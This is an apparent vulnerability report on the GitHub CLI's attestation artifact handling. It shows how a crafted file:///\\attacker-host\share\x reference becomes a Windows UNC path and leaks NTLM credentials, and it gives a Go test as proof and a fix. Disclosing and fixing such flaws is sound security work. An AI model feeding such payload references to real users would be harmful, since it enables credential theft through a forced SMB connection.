### Title
`normalizeReference` can convert a `file:///\\host\share\...` reference into a UNC path opened by `digestLocalFileArtifact` on Windows - (File: `pkg/cmd/attestation/artifact/artifact.go`)

### Summary
`normalizeReference` only ever reads `uri.Path` from `url.ParseRequestURI` and never inspects/rejects `uri.Host`, then blindly does `ReplaceAll("/", "\")` and strips a single leading separator on Windows. A crafted `file://` reference containing backslashes can be parsed such that the leading path segment collapses to a two-backslash UNC prefix, which `filepath.Clean` preserves and `digestLocalFileArtifact` then opens with `os.Open`, causing Windows to perform an SMB/NTLM authentication attempt against an attacker-controlled host.

### Finding Description
The exact PoC given in the question, `file://\\attacker-host\share\x` (two backslashes right after `file://`, no forward slash anywhere), does **not** trigger the bug as literally written: because Go's `net/url` authority parser terminates the host component only at `/`, `?`, or `#`, and backslash is not such a terminator, the entire remainder `\\attacker-host\share\x` is consumed into `uri.Host` and `uri.Path` is empty. Since `normalizeReference` (`pkg/cmd/attestation/artifact/artifact.go:34-51`) only ever reads `uri.Path` and discards `uri.Host` entirely, this specific input degenerates to an empty/`.` path — not exploitable as stated.

However, a closely related and still attacker-controlled variant *is* exploitable: `file:///\\attacker-host\share\x` (three slashes, so the authority is empty and the path begins immediately at the first `/`). Here `uri.Path` becomes `/\\attacker-host\share\x` (a leading `/` followed by literal backslashes, since `net/url` does not interpret or reject backslashes inside a path). On Windows, `normalizeReference` then does:
```go
path = strings.ReplaceAll(uri.Path, "/", string(pathSeparator)) // "\" + "\\attacker-host\share\x" -> "\\\attacker-host\share\x"
if strings.HasPrefix(path, string(pathSeparator)) {
    path = path[1:] // strips exactly one leading backslash
}
``` [1](#0-0) 
This leaves a path beginning with exactly two backslashes followed by a hostname/share (`\\attacker-host\share\x`), which is a well-formed Windows UNC path. `filepath.Clean` on Windows explicitly preserves the `\\host\share` UNC prefix rather than stripping it. The resulting string is passed unchanged into `digestLocalFileArtifact`, which calls `os.Open(filename)` [2](#0-1) . `os.Open` on a UNC path causes the Windows OS/CIFS client to initiate an SMB connection to `attacker-host`, which will trigger NTLM authentication negotiation against that host — a well-known credential-leak/relay primitive (the "UNC path injection" class of bug).

The attacker-controlled input is the artifact reference string passed to `gh attestation verify <ref>`, which per the question's threat model could come from copy-pasted content in a release note, README, or script that an attacker publishes. There is no host allowlist, no scheme/host validation, and no rejection of backslashes or of a non-empty `uri.Host`/UNC-looking path anywhere in `normalizeReference` or `NewDigestedArtifact`.

### Impact Explanation
If a victim runs `gh attestation verify` on Windows with an attacker-supplied `file://` reference containing this pattern, the OS will attempt to connect to and authenticate against the attacker's SMB share, leaking the victim's NTLM hash/credentials (a classic UNC-path credential-relay/leak, matching GitHub's "sensitive data exposure" / credential-leak bounty class). This does not lead to remote code execution by itself but is a real, network-triggered credential disclosure vector confined to the Windows platform.

### Likelihood Explanation
Requires: (1) victim on Windows, (2) victim manually supplies/copies an attacker-crafted string as the artifact reference argument to `gh attestation verify`. This is a social-engineering-adjacent but plausible scenario (attacker publishes a "verify command" snippet in a release note or script). The exact reference format needed (`file:///\\host\share\path`, three slashes) is a specific but not obscure construction, and is fully attacker-controlled since it's just a command-line string the victim types/pastes.

### Recommendation
In `normalizeReference` (`pkg/cmd/attestation/artifact/artifact.go`), reject any `file://` reference whose parsed `uri.Host` is non-empty, and reject/refuse any resulting path that begins with two path separators (i.e., looks like a UNC path) before returning it. Do not perform blind string replacement of `/` with `\` on attacker-supplied URI paths without first validating the path does not introduce a UNC prefix.

### Proof of Concept
```go
// pkg/cmd/attestation/artifact/artifact_windows_test.go (add case)
func TestNormalizeReference_UNCInjection(t *testing.T) {
    result, artifactType, err := normalizeReference(`file:///\\attacker-host\share\x`, '\\')
    require.NoError(t, err)
    require.Equal(t, fileArtifactType, artifactType)
    // BUG: result becomes a UNC path pointing at a remote host
    require.False(t, strings.HasPrefix(result, `\\`), "normalized path must never be a UNC network path: got %q", result)
}
```
Expected (buggy) behavior: `result == `\\attacker-host\share\x`` and the assertion fails, demonstrating that `digestLocalFileArtifact` would call `os.Open` on a remote UNC path.
